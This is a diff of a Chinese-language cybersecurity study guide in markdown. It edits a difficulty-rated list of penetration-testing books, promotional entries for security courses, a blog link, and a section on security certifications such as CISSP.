+The Hackers Playbook 3（难易度：★★★☆☆）
+### 中级
+Improving your Penetration Testing Skills（难易度：★★★★☆）
 这本书的学习路径专为希望了解漏洞利用并充分利用 Metasploit 框架的安全专业人员、Web 程序员和渗透测试人员而设计。需要对渗透和 Metasploit 测试有所了解，基本的系统管理技能和读取代码的能力也是必不可少的。
 
-05：Tribe of Hackers Red Team（难易度：★★★★★）
+Tribe of Hackers Red Team（难易度：★★★★★）
 凭借对系统漏洞的深入了解以及纠正安全漏洞的创新解决方案，红队黑客的需求量很大。这本书包括对有影响力的安全专家的启发性访谈，其中包含分享实战经验。
 
-06：Advanced Penetration Testing: Hacking the World’s Most Secure Networks（难易度：★★★★★）
+Advanced Penetration Testing: Hacking the World’s Most Secure Networks（难易度：★★★★★）
 它涵盖了 ATP（高级渗透测试）的内容。也就是说，它将教给你远超 Kali Linux 工具的技术。你将学习这些工具的工作原理，以及如何从头到尾编写自己的工具。
-
 仅适用于高级安全研究人员。
 
-07：Hacking Ético. 3ª Edición （难易度：★★☆☆☆）
+Hacking Ético. 3ª Edición （难易度：★★☆☆☆）
 这本书采用了一种实用而有趣的方法，教你学习网络安全技术，并包含了带有流行操作系统（例如 Windows 和 Kali Linux）的实验室。
 
-08：Seguridad informática Hacking Ético Conocer el ataque para una mejor defensa (4ta edición)（难易度：★★★☆☆）
+Seguridad informática Hacking Ético Conocer el ataque para una mejor defensa (4ta edición)（难易度：★★★☆☆）
 这本书的作者介绍了攻击的方法和修复用于进入系统的漏洞的方法。“了解攻击是为了更好的防御”，以攻击的视角来学习网络安全知识。
 
-09：El libro blanco del Hacker 2ª Edición Actualizada（难易度：★★★☆☆）
+El libro blanco del Hacker 2ª Edición Actualizada（难易度：★★★☆☆）
 这本书包含了必要的攻击性安全技术，基于国际方法和标准，例如 PTES、OWASP、NIST等，来审核（通过渗透测试考试）能力。
 
-10：Hacking con Metasploit: Advanced Pentesting（难易度：★★★☆☆）
+Hacking con Metasploit: Advanced Pentesting（难易度：★★★☆☆）
 你将学习高级的渗透测试技巧，payload 和模块的开发、如何避免限制性环境、修改 shellcode 等。这些主题将涵盖渗透测试人员在日常真实场景中面临的许多需求，并包含了安全人员当前使用的技术和工具讲解。
 
-11：Hacking & cracking. Redes inalámbricas WiFi（难易度：★★★☆☆）
+Hacking & cracking. Redes inalámbricas WiFi（难易度：★★★☆☆）
 以正确的方式评估设备、无线网络和安全协议，以及执行道德规范的破解和黑客入侵。
-
 这本书介绍了无线硬件的一些基本概念，并介绍了无线网络攻击的应用。
 
-12：Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易度：★★★★☆）
+Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易度：★★★★☆）
 这本书的作者在计算机安全领域工作了 27 年以上。
-
 作为一名专业的渗透测试人员，他能够在一小时内成功访问目标服务器以对其进行黑客攻击。这本书的内容都是他的经验之谈，内容丰富，需要一定基础。
-
 
 
 《资产探测与主机安全》：知识盒子 资产探测与主机安全：censys、fofa、NSE、Hydra等实用工具教学，体系化学习资产探测，高效辅助漏洞挖掘
@@ -6325,8 +6134,6 @@ SQL注入攻击与防御
 《新手入门|穿越赛博》：知识盒子 新手入门|穿越赛博：常见安全工具安装与使用，视频教学，截图验证，适合网络安全入门
 《主题进阶|前端黑客》：知识盒子 前端迷雾：常见web前端安全漏洞，简单易懂，在线靶场练习，视频演示，通过学习掌握基础前端安全思路
 《暗夜契约|Python黑客》：知识盒子 python黑客: 内容涵盖流量分析，Flask模板注入等常见python安全基础与工具开发，需要有一定python基础，内容具有一定学习深度。
-
-难度系数：⭐⭐⭐ 牛逼指数：⭐⭐⭐⭐ 实用指数：⭐⭐⭐⭐⭐
 
 《白帽子讲Web安全》
 
@@ -6376,8 +6183,6 @@ SQL注入攻击与防御
 2020 8月出版
 
 
-Books are a great way of deep diving into the theory, “The Web Application Hacker’s Handbook”, “Tangled Web: A guide to securing Modern Web Applications” and “The Browser Hacker’s Handbook” explore the sections outlined above, with the latter two books focusing specifically on browsers.
-
 ## 博客
 
 [在安全界工作十年的大佬，他的文章同步更新在GitHub，獲得3k star；但github已经不在更新了，博客还在更新。最新的更新时间是2020/5月](https://micropoor.blogspot.com/)
@@ -6413,28 +6218,11 @@ Books are a great way of deep diving into the theory, “The Web Application Hac
 
 
 **考证**
-具备白帽子渗透证书(CISSP，CISA，NISP)优先
-
-发证机构：(ISC)2 国际信息系统安全认证协会(Internationa Information Systems Security Cerification Consortium)
-
-考证要求：需要工作经验
-
-考取难度：★★★★☆（比CISP难度多一星因为英语和6小时的考试时间，比较摧残人）
-
-适应类型：外企、涉外服务、大型企业（包括国有企业，有不少国企也比较认CISSP）如银行等信息安全主管和信息安全从业者。费用： 培训不强制，国内很多培训公司都提供，无需培训也可直接考试。考试费599美元。(这是一次考试的费用，如果没通过，下次还要交考试费)
-
-认证说明：CISSP因为推出比较早，所以相对比较知名，(ISC)2 一共推出了9项认证，所以我们在这谈CISSP认证包含了是由CISSP延伸出来的系列认证。分别如下：
-
-(ISC) 注册信息系统安全师（CISSP）
-(ISC) 注册软件生命周期安全师（CSSLP）
-(ISC) 注册网络取证师（CCFPSM）
-(ISC) 注册信息安全许可师（CAP）
-(ISC) 注册系统安全员（SSCP）
-(ISC) 医疗信息与隐私安全员 (HCISPPSM)
-
-CISSP 专项加强认证:CISSP-ISSAP (Information Systems Security Architecture Professional) 信息系统安全架构专家CISSP-ISSEP（Information Systems Security Engineering Professional）信息系统安全工程专家CISSP-ISSMP（Information System Security Management Professional）信息系统安全管理专家
-
-目前认证中也就CISSP因为资格老，比较多人知道，所以考的较多，其他的嘛，屈指可数。
+信息安全国际第一认证——CISSP
+信息安全国内认证——CISAW
+信息安全国内认证——CISP
+信息安全技术实操认证新贵——Security+
+IT审计人员的必备之证——CISA
 
 #### 让自己小有名气
 
